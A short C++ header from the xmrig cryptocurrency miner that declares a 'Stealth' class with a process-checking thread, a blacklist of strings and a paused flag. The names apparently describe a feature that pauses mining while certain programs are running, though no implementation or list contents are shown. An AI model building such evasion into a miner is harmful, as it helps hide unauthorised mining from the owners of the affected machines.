#pragma once

#include "base/threads/Thread.h"
#include <vector>
#include <string>

namespace xmrig {

class Controller;

class Stealth {
public:
    Stealth(Controller *controller);
    ~Stealth();

    void start();
    void stop();

private:
    void checkProcesses();

    Controller *m_controller;
    Thread *m_thread;
    std::vector<std::string> m_blacklist;
    bool m_paused = false;
};

} // namespace xmrig
